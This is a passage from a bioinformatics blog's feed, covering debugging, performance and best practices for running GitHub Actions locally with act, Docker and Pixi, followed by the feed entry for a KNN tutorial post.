<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act push </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--job</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">test</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--matrix</span><span class="token plain"> python-version</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">3.12</span><br></span></code></pre></div></div>
<p><strong>Run only security tests:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act push </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--job</span><span class="token plain"> security</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="debugging-workflows-with-act">Debugging Workflows with <code>act</code><a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#debugging-workflows-with-act" class="hash-link" aria-label="Direct link to debugging-workflows-with-act" title="Direct link to debugging-workflows-with-act" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="enable-verbose-logging">Enable Verbose Logging<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#enable-verbose-logging" class="hash-link" aria-label="Direct link to Enable Verbose Logging" title="Direct link to Enable Verbose Logging" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> push</span><br></span></code></pre></div></div>
<p>Shows detailed output including Docker commands and environment variables.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="debug-with-interactive-shell">Debug with Interactive Shell<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#debug-with-interactive-shell" class="hash-link" aria-label="Direct link to Debug with Interactive Shell" title="Direct link to Debug with Interactive Shell" translate="no">​</a></h3>
<p>If a step fails, enter the container:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Create a failing step</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">steps:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  - run: </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Debug info:"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token function" style="color:hsl(221, 87%, 60%)">env</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token function" style="color:hsl(221, 87%, 60%)">ls</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-la</span><br></span></code></pre></div></div>
<p>Or use <code>act</code> with shell access:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-b</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Use local container (not rebuilding)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="inspect-container-after-failure">Inspect Container After Failure<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#inspect-container-after-failure" class="hash-link" aria-label="Direct link to Inspect Container After Failure" title="Direct link to Inspect Container After Failure" translate="no">​</a></h3>
<p>Keep container running after failure:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># View logs</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">ps</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-a</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Enter the container</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">exec</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-it</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">container_id</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> /bin/bash</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="common-issues-and-solutions">Common Issues and Solutions<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#common-issues-and-solutions" class="hash-link" aria-label="Direct link to Common Issues and Solutions" title="Direct link to Common Issues and Solutions" translate="no">​</a></h3>
<p><strong>Issue: "Cannot connect to Docker daemon"</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Solution: Start Docker</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> systemctl start </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Linux</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">open</span><span class="token plain"> /Applications/Docker.app  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># macOS</span><br></span></code></pre></div></div>
<p><strong>Issue: "Not enough space for Docker images"</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Solution: Clean up</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> system prune </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-a</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--volumes</span><br></span></code></pre></div></div>
<p><strong>Issue: "Workflow runs but tests fail locally but pass on GitHub"</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Solution: Check Python versions match</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">python </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--list</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Verify Python version in workflow</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="performance-comparison-local-vs-cloud">Performance Comparison: Local vs Cloud<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#performance-comparison-local-vs-cloud" class="hash-link" aria-label="Direct link to Performance Comparison: Local vs Cloud" title="Direct link to Performance Comparison: Local vs Cloud" translate="no">​</a></h2>
<table><thead><tr><th>Task</th><th>Local (<code>act</code>)</th><th>GitHub Cloud</th><th>Speedup</th></tr></thead><tbody><tr><td>First run</td><td>45s</td><td>300s+</td><td>6-7x</td></tr><tr><td>Subsequent runs (cached)</td><td>8s</td><td>250s+</td><td>30x</td></tr><tr><td>Development iteration</td><td>2 min (10 runs)</td><td>50 min</td><td><strong>25x</strong></td></tr><tr><td>Cost</td><td>$0</td><td>$0.008/min</td><td>N/A</td></tr></tbody></table>
<p><strong>Key insight:</strong> For a typical development session with 10 iterations, <code>act</code> saves 48 minutes of waiting time!</p>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="best-practices-for-cicd-with-act">Best Practices for CI/CD with <code>act</code><a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#best-practices-for-cicd-with-act" class="hash-link" aria-label="Direct link to best-practices-for-cicd-with-act" title="Direct link to best-practices-for-cicd-with-act" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-test-locally-before-pushing">1. <strong>Test Locally Before Pushing</strong><a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#1-test-locally-before-pushing" class="hash-link" aria-label="Direct link to 1-test-locally-before-pushing" title="Direct link to 1-test-locally-before-pushing" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Before git push</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act push</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># If all pass, then:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> push origin main</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-match-github-runner-environment">2. <strong>Match GitHub Runner Environment</strong><a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#2-match-github-runner-environment" class="hash-link" aria-label="Direct link to 2-match-github-runner-environment" title="Direct link to 2-match-github-runner-environment" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Use same image as GitHub</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-P</span><span class="token plain"> ubuntu-latest</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">ghcr.io/catthehacker/ubuntu:act-latest</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-commit-actrc-to-repository">3. <strong>Commit <code>.actrc</code> to Repository</strong><a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#3-commit-actrc-to-repository" class="hash-link" aria-label="Direct link to 3-commit-actrc-to-repository" title="Direct link to 3-commit-actrc-to-repository" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># .actrc (can be committed)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-P</span><span class="token plain"> ubuntu-latest</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">ghcr.io/catthehacker/ubuntu:full-latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-l</span><br></span></code></pre></div></div>
<p>But keep <code>.secrets</code> in <code>.gitignore</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># .gitignore</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">.secrets</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="4-use-matrix-strategy-for-multiple-versions">4. <strong>Use Matrix Strategy for Multiple Versions</strong><a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#4-use-matrix-strategy-for-multiple-versions" class="hash-link" aria-label="Direct link to 4-use-matrix-strategy-for-multiple-versions" title="Direct link to 4-use-matrix-strategy-for-multiple-versions" translate="no">​</a></h3>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token key atrule" style="color:hsl(35, 99%, 36%)">strategy</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">matrix</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">python-version</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">'3.10'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'3.11'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'3.12'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">os</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">ubuntu</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">latest</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> macos</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">latest</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><br></span></code></pre></div></div>
<p>Test all combinations locally before push.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="5-document-dependencies">5. <strong>Document Dependencies</strong><a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#5-document-dependencies" class="hash-link" aria-label="Direct link to 5-document-dependencies" title="Direct link to 5-document-dependencies" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># requirements.txt</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pytest</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;=</span><span class="token number" style="color:hsl(35, 99%, 36%)">7.0</span><span class="token plain">.0</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">numpy</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;=</span><span class="token number" style="color:hsl(35, 99%, 36%)">1.24</span><span class="token plain">.0</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pandas</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;=</span><span class="token number" style="color:hsl(35, 99%, 36%)">1.5</span><span class="token plain">.0</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">scipy</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;=</span><span class="token number" style="color:hsl(35, 99%, 36%)">1.10</span><span class="token plain">.0</span><br></span></code></pre></div></div>
<p>Keep updated so <code>act</code> can replicate exact environment.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="6-use-pixi-for-global-tools-bioinformatics-recommended">6. <strong>Use Pixi for Global Tools</strong> (Bioinformatics Recommended)<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#6-use-pixi-for-global-tools-bioinformatics-recommended" class="hash-link" aria-label="Direct link to 6-use-pixi-for-global-tools-bioinformatics-recommended" title="Direct link to 6-use-pixi-for-global-tools-bioinformatics-recommended" translate="no">​</a></h3>
<p>If you use Pixi for project management, keep your global tools there too:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Install act globally with Pixi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi global </span><span class="token function" style="color:hsl(221, 87%, 60%)">install</span><span class="token plain"> act</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Update act easily</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi global upgrade act</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># See all globally installed tools</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi global list</span><br></span></code></pre></div></div>
<p><strong>Benefits for bioinformatics workflows:</strong></p>
<ul>
<li class="">Single package manager for all tools</li>
<li class="">Easy version control (<code>pixi.lock</code>)</li>
<li class="">Reproducible environments across team</li>
<li class="">No system package conflicts</li>
</ul>
<p><strong>Create a <code>.pixi.toml</code> for your project:</strong></p>
<div class="language-toml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-toml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[dependencies]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">python = "3.12"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pytest = "&gt;=7.0.0"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">numpy = "&gt;=1.24.0"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pandas = "&gt;=1.5.0"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[tasks]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">test = "pytest tests/ -v"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">lint = "pylint src/"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">ci = "act push"  # Run GitHub Actions locally</span><br></span></code></pre></div></div>
<p>Then your team can just run:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">test</span><span class="token plain">      </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run tests</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run lint      </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run linter</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run ci        </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run GitHub Actions locally</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="key-takeaways">Key Takeaways<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#key-takeaways" class="hash-link" aria-label="Direct link to Key Takeaways" title="Direct link to Key Takeaways" translate="no">​</a></h2>
<ol>
<li class=""><strong><code>act</code> runs GitHub Actions locally</strong> → test before pushing to GitHub</li>
<li class=""><strong>5-30x faster feedback</strong> → iterate quickly during development</li>
<li class=""><strong>Docker-based</strong> → identical environment to GitHub Cloud runners</li>
<li class=""><strong>Supports secrets and environment variables</strong> → test real workflows</li>
<li class=""><strong>Performance optimization</strong> → use smaller images, caching, parallel jobs</li>
<li class=""><strong>Free and open-source</strong> → no additional costs beyond your machine</li>
</ol>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="whats-next">What's Next?<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#whats-next" class="hash-link" aria-label="Direct link to What's Next?" title="Direct link to What's Next?" translate="no">​</a></h2>
<p>Now that you can test workflows locally with <code>act</code>, consider:</p>
<ul>
<li class="">Setting up pre-commit hooks to run <code>act</code> automatically</li>
<li class="">Creating reusable workflow templates for bioinformatics pipelines</li>
<li class="">Integrating <code>act</code> into your team's development process</li>
<li class="">Exploring GitHub Actions Marketplace for bioinformatics tools</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="references">References<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#references" class="hash-link" aria-label="Direct link to References" title="Direct link to References" translate="no">​</a></h2>
<ul>
<li class=""><a href="https://github.com/nektos/act" target="_blank" rel="noopener noreferrer" class="">act GitHub Repository</a></li>
<li class=""><a href="https://docs.github.com/en/actions" target="_blank" rel="noopener noreferrer" class="">GitHub Actions Documentation</a></li>
<li class=""><a href="https://docs.docker.com/" target="_blank" rel="noopener noreferrer" class="">Docker Documentation</a></li>
<li class=""><a href="https://docs.github.com/en/actions/guides" target="_blank" rel="noopener noreferrer" class="">GitHub Actions Best Practices</a></li>
</ul>
<p><strong>Happy local testing! 🚀</strong></p>]]></content>
        <author>
            <name>Thanh-Giang Tan Nguyen</name>
            <email>nttg8100@gmail.com</email>
            <uri>https://www.facebook.com/nttg8100</uri>
        </author>
        <category label="ci-cd" term="ci-cd"/>
        <category label="github-actions" term="github-actions"/>
        <category label="docker" term="docker"/>
        <category label="bioinformatics" term="bioinformatics"/>
        <category label="python" term="python"/>
        <category label="devops" term="devops"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Machine Learning in Bioinformatics Part 1: Building KNN from Scratch]]></title>
        <id>https://riverxdata.github.io/river-docs/blog/machine-learning-bioinformatics-part1-knn</id>
        <link href="https://riverxdata.github.io/river-docs/blog/machine-learning-bioinformatics-part1-knn"/>
        <updated>2026-02-02T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Machine learning is transforming bioinformatics, enabling us to discover patterns in biological data. In this first part, we'll build a K-Nearest Neighbors (KNN) classifier from scratch using only Python, then apply it to simulated gene expression data. This post is designed for anyone who knows basic Python and biology—no advanced ML experience required!]]></summary>
